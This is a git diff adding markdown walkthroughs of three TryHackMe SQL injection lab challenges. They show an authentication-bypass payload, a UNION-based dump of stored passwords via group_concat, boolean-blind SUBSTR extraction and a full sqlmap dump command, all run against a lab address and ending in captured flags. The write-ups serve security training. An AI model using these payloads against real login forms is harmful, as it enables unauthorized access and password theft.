@@ -172,3 +172,161 @@ Summary Table: Module 2 Findings
 | Target Field          | secrets.secret                            | 
 | Module 2 Flag         | THM{b3a540515dbd9847c29cffa1bef1edfb}     |
 
+## SQL Injection Lab (Module 3)
+Executive Summary
+This document details the exploitation methodology for Task 4: Vulnerable Startup: Broken Authentication (Challenge 1) on TryHackMe. The vulnerability involves an In-Band SQL Injection in the login POST parameter, allowing complete authentication bypass to log in as an arbitrary user and retrieve the system flag.
+
+Target & Vulnerability Overview
+- Target URL: [http://10.48.174.24:5000/challenge1/login](http://10.48.174.24:5000/challenge1/login)
+- Vulnerability Class: SQL Injection (Authentication Bypass)
+- Vulnerable Parameter: username (HTTP POST)
+- Impact: Complete authorization bypass, enabling access to privileged accounts without knowing the password.
+
+Step-by-Step Exploitation Methodology
+1. Application Inspection & Form Interception
+    - Navigated to the challenge login interface at [http://10.48.174.24:5000/challenge1/login](http://10.48.174.24:5000/challenge1/login).
+    - Attempted a baseline login using dummy credentials (admin / pass) and captured the HTTP request via Burp Suite.
+    - HTTP POST Body:
+```http
+username=admin&password=pass
+```
+2. SQL Injection Payload Construction
+- The backend constructs a ```SELECT``` query to validate credentials:
+```sql
+SELECT id, username FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT'
+```
+- To force the evaluation logic to return TRUE and comment out the password check, an inline comment payload was injected into the username field:
+- Injected Payload:
+```sql
+admin' or 1=1--
+```
+- Modified Request Line (Burp Suite Proxy):
+```http
+username=admin'+or+1=1--+&password=pass
+```
+3. Execution & Flag Retrieval
+- Submitting the payload altered the backend query structure to evaluate as always true:
+```sql
+SELECT id, username FROM users WHERE username = 'admin' or 1=1-- ' AND password = 'pass'
+```
+- The backend executed query returned a valid session, redirecting to ```/challenge1/home```.
+- The authenticated session revealed the challenge message containing the target flag.
+
+Summary Table: Module 3 Details
+| Parameter / Entity    | Target / Value                                                                          |
+|:--                    |:--                                                                                      |
+| Target Endpoint       | [http://10.48.174.24:5000/challenge1/login](http://10.48.174.24:5000/challenge1/login)  |
+| Vulnerable Parameter  | username                                                                                |
+| Injection Payload     | admin' or 1=1--                                                                         |
+| Captured Flag         | THM{f35f47dcd9d596f0d3860d14cd4c68ec}                                                   |
+
+## SQL Injection Lab (Module 4)
+Executive Summary
+This document details the complete technical walkthrough for Task 5: Vulnerable Startup: Broken Authentication 2 (Challenge 2) on TryHackMe. The vulnerability expands on simple authentication bypass by leveraging a UNION-based SQL Injection to exfiltrate table contents (passwords) without relying on blind injection.
+
+Target & Vulnerability Overview
+- Target URL: ```[http://10.48.174.24:5000/challenge2/login](http://10.48.174.24:5000/challenge2/login)```
+- Vulnerability Class: UNION-Based In-Band SQL Injection
+- Vulnerable Parameter: ```username``` (HTTP POST)
+- Objective: Dump all password entries from the users table to locate and retrieve the hidden challenge flag.
+
+Step-by-Step Exploitation Methodology
+1. Application Reflection & Injection Surface Mapping
+The baseline query executed by the login endpoint extracts two specific columns:
+```sql
+SELECT id, username FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT'
+```
+- Reflection Point 1: The ```username``` result from the SQL query reflects directly in the upper-right UI banner (```Logged in as <USERNAME>```).
+- Reflection Point 2: Decoded Flask session cookies (```challenge2_username```) store and reflect query output.
+
+2. Column Structure & Data Type Enumeration
+To execute a successful ```UNION``` attack, the injected query must match the column count and compatible data types of the original query:
+- Testing Column Balance:
+```sql
+' UNION SELECT NULL-- -
+' UNION SELECT NULL, NULL-- -
+```
+- Injecting Valid Column Structure:
+```sql
+' UNION SELECT 1, 2-- -
+```
+(Result: Successful login displaying Logged in as 2 in the top right corner, establishing that column 2 reflects string output.)
+
+3. In-Band Schema Exfiltration & Aggregation Payload
+To extract all user password rows in a single output string, the SQLite aggregate function ```group_concat()``` was applied to column 2:
+- Injected Username Field:
+```sql
+' union select 1,group_concat(password) from users--
+```
+- Executed Query on Server:
+```sql
+SELECT id, username FROM users WHERE username = '' union select 1,group_concat(password) from users-- ' AND password = 'pass'
+```
+4. Execution & Flag Extraction
+Submitting the group_concat payload aggregated all stored user passwords into the reflection banner:
+- Exfiltrated Password String:
+```plaintext
+rcLYWHCXeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{fb381dfee71ef9c31b93625ad540c9fa},viking123
+```
+Summary Table: Module 4 Details
+| Parameter / Entity         | Target / Value                                                                          |
+|:--                         |:--                                                                                      |
+| Target Endpoint            | [http://10.48.174.24:5000/challenge2/login](http://10.48.174.24:5000/challenge2/login)  |
+| Vulnerable Field           | username                                                                                |
+| Exploit Type               | UNION-Based In-Band SQL Injection                                                       |
+| Final Injection Payload    | "' union select 1,group_concat(password) from users-- "                                 |
+| Captured Flag              | THM{fb381dfee71ef9c31b93625ad540c9fa}                                                   |
+
+## SQL Injection Lab (Module 5)
+Executive Summary
+This document outlines the exploitation methodology for Task 6: Vulnerable Startup: Broken Authentication 3 on TryHackMe. Unlike previous challenges where query outputs were directly reflected in the interface or session cookies, this challenge requires a Boolean-based Blind SQL Injection attack vector to enumerate data character-by-character based on application response behavior.
+
+Target & Vulnerability Overview
+- Target URL: ```[http://10.48.174.24:5000/challenge3/login](http://10.48.174.24:5000/challenge3/login)```
+- Vulnerability Class: Boolean-Based Blind SQL Injection
+- Vulnerable Parameter: ```username``` (HTTP POST)
+- Objective: Extract the admin password byte-by-byte using conditional logic or automated tools to recover the challenge flag.
+
+Step-by-Step Exploitation Methodology
+1. Response Behavior Analysis
+    - Application feedback differs depending on the truth value of the injected condition:
+        - True Condition: Server returns an HTTP ```302 Found``` redirect to ```/challenge3/home```.
+        - False Condition: Server stays on /challenge3/login displaying "```Invalid username or password```".
+
+2. Injected Boolean Logic & Substring Construction
+- SQLite's ```SUBSTR()``` function isolates target characters from the database entry:
+```sql
+SUBSTR((SELECT password FROM users LIMIT 0,1), 1, 1)
+```
+- To prevent case sensitivity conflicts from lowercased inputs, hexadecimal casting with SQLite's ```CAST()``` function converts target comparison characters:
+```sql
+CAST(X'54' AS Text)
+```
+- Constructed Injected Query (Manual Structure):
+```sql
+admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' AS Text)-- -
+```
+- Executed Server-Side SQL:
+```sql
+SELECT id, username FROM users WHERE username = 'admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' AS Text)
+```
+3. Automated Exploitation via ```sqlmap```
+Due to the overhead of manual character enumeration, ```sqlmap``` was deployed to automate the Boolean-based blind extraction.
+- Executed Terminal Command:
+```bash
+sqlmap -u "http://10.48.174.24:5000/challenge3/login" \
+  --data="username=admin&password=admin" \
+  --level=5 --risk=3 \
+  --dbms=sqlite --technique=B --dump
+```
+- Execution Log Findings:
+    - Identified POST parameter username as vulnerable to ```OR boolean-based blind - WHERE or HAVING clause```.
+    - Dumped the ```users``` table schema and full row entries.
+
+Summary Table: Module 5 Details
+| Parameter / Entity       | Target / Value                                                                                                                                     | | :--                      | :--                                                                                                                                                |
+| Target Endpoint          | [http://10.48.174.24:5000/challenge3/login](http://10.48.174.24:5000/challenge3/login)                                                             |
+| Vulnerable Parameter     | username                                                                                                                                           |
+| Exploit Technique        | Boolean-Based Blind SQL Injection                                                                                                                  |
+| Automation Tool Command  | "sqlmap -u ""[http://10.48.174.24:5000/challenge3/login](http://10.48.174.24:5000/challenge3/login)"" --data=""username=admin&password=admin"" --  |level=5 --risk=3 --dbms=sqlite --technique=B --dump"
+| Captured Flag            | THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}                                                                                                              |
